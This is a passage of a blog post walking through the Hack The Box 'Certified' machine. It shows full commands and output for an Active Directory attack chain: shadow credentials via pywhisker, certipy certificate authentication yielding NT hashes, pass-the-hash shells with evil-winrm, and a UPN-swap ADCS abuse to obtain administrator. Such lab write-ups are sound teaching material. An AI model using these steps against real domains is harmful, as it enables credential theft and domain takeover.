+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ python3 pywhisker.py  --dc-ip 10.129.22.253 -d <span class="string">&quot;certified.htb&quot;</span> -u <span class="string">&quot;judith.mader&quot;</span> -p <span class="string">&#x27;judith09&#x27;</span> --target <span class="string">&quot;management_svc&quot;</span> --action <span class="string">&quot;add&quot;</span>  </span><br><span class="line">[*] Searching <span class="keyword">for</span> the target account</span><br><span class="line">[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating KeyCredential</span><br><span class="line">[*] KeyCredential generated with DeviceID: b408c279-49d2-1cf9-a680-792376ef3f43</span><br><span class="line">[*] Updating the msDS-KeyCredentialLink attribute of management_svc</span><br><span class="line">[+] Updated the msDS-KeyCredentialLink attribute of the target object</span><br><span class="line">[+] Saved PFX (<span class="comment">#PKCS12) certificate &amp; key at path: O5DKZp1j.pfx</span></span><br><span class="line">[*] Must be used with password: E1oblaZPhYWbHhc8Z169</span><br><span class="line">[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ certipy-ad cert -<span class="built_in">export</span> -pfx <span class="string">&quot;/home/kali/Hackthebox/Certified/pywhisker/O5DKZp1j.pfx&quot;</span> -password <span class="string">&quot;E1oblaZPhYWbHhc8Z169&quot;</span> -out <span class="string">&quot;unprotected.pfx&quot;</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Writing PFX to <span class="string">&#x27;unprotected.pfx&#x27;</span></span><br><span class="line">                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ certipy-ad auth -pfx unprotected.pfx -dc-ip <span class="string">&#x27;10.129.22.253&#x27;</span> -username <span class="string">&#x27;management_svc&#x27;</span> -domain <span class="string">&#x27;certified.htb&#x27;</span> </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] Could not find identification <span class="keyword">in</span> the provided certificate</span><br><span class="line">[*] Using principal: management_svc@certified.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;management_svc.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;management_svc&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;management_svc@certified.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584</span><br></pre></td></tr></table></figure></div>
+
+<p>And we got it!</p>
+<p>Now we can grab our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ evil-winrm -i 10.129.22.253 -u management_svc -H <span class="string">&#x27;a091c1832bcdd4677c28b5a6a1295584&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; <span class="built_in">type</span> ../desktop/user.txt</span><br><span class="line">15df55cc8b45dd564d9e16cdc7ce4196</span><br><span class="line">*Evil-WinRM* PS C:\Users\management_svc\Documents&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Looking at the privilege svc_management has, we can see he has GenericAll on ca_operator. What we can do is change ca_operator’s password, update his UPN to the administrator’s, request a certificate using certipy then authenticate to the administrator to get his hashes.</p>
+<h4 id="Changing-ca-operator-password"><a href="#Changing-ca-operator-password" class="headerlink" title="Changing ca_operator password"></a>Changing ca_operator password</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ pth-net rpc password <span class="string">&quot;ca_operator&quot;</span> <span class="string">&quot;NewPasswordKujen@2025#&quot;</span> -U <span class="string">&quot;certified.htb&quot;</span>/<span class="string">&quot;management_svc&quot;</span>%<span class="string">&quot;aad3b435b51404eeaad3b435b51404ee&quot;</span>:<span class="string">&quot;a091c1832bcdd4677c28b5a6a1295584&quot;</span> -S <span class="string">&quot;DC01.certified.htb&quot;</span> </span><br><span class="line">E_md4hash wrapper called.</span><br><span class="line">HASH PASS: Substituting user supplied NTLM HASH...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Change-ca-operator-UPN-to-administrator"><a href="#Change-ca-operator-UPN-to-administrator" class="headerlink" title="Change ca_operator UPN to administrator"></a>Change ca_operator UPN to administrator</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ certipy-ad  account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user <span class="string">&#x27;ca_operator&#x27;</span>:</span><br><span class="line">    userPrincipalName                   : Administrator</span><br><span class="line">[*] Successfully updated <span class="string">&#x27;ca_operator&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Request-a-certificate-through-ADCS"><a href="#Request-a-certificate-through-ADCS" class="headerlink" title="Request a certificate through ADCS"></a>Request a certificate through ADCS</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ certipy-ad  req -username ca_operator@certified.htb -p NewPasswordKujen@2025<span class="comment"># -ca certified-DC01-CA -template CertifiedAuthentication -debug</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\(&#x27;</span></span><br><span class="line">  <span class="string">&quot;(0x[a-zA-Z0-9]+) \([-]?[0-9]+ &quot;</span>,</span><br><span class="line">[+] Trying to resolve <span class="string">&#x27;CERTIFIED.HTB&#x27;</span> at <span class="string">&#x27;192.168.235.2&#x27;</span></span><br><span class="line">[+] Resolved <span class="string">&#x27;CERTIFIED.HTB&#x27;</span> from cache: 10.129.22.253</span><br><span class="line">[+] Generating RSA key</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[+] Trying to connect to endpoint: ncacn_np:10.129.22.253[\pipe\cert]</span><br><span class="line">[+] Connected to endpoint: ncacn_np:10.129.22.253[\pipe\cert]</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 4</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And now we can auth to the user and get his hash:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ certipy-ad auth -pfx administrator.pfx -domain certified.htb </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@certified.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@certified.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</span><br><span class="line">                                              </span><br></pre></td></tr></table></figure></div>
+
+
+<p>And we can now claim our root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Certified/pywhisker]</span><br><span class="line">└─$ evil-winrm -i 10.129.22.253 -u administrator -H <span class="string">&#x27;0d5b49608bbce1751f708748f67e2d34&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">type</span> ../desktop/root.txt</span><br><span class="line">a3bee3c7ebc8c6dc7f0bf15e791c1f84</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Certified, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Certified</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-03-14 17:28:50</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-03-14 18:54:39
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/03/14/Hackthebox-Certified/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/03/05/Hackthebox-Chemistry/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Chemistry</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Certified</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Foothold"><span class="nav-text">Foothold</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
